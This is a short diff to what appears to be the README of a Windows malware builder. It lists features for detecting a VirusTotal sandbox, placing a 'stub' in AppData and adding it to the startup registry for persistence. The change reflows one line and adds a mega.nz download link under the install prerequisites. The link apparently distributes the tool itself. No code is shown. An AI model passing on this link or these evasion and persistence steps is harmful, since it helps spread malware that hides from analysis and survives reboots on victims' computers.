@@ -34,8 +34,10 @@ Check if being run in a virustotal sandbox
 Startup persistence
 
 Place stub in appdata
-Add to startup registry
+Add to startup
+ registry
 Install
 Prerequisites
 Windows 10/11
 Python
+https://mega.nz/file/4G1zjRxC#cMR-dYA4LqSTZCyK3qKUZnQcwwrDv8lHBKP0tkpGIes
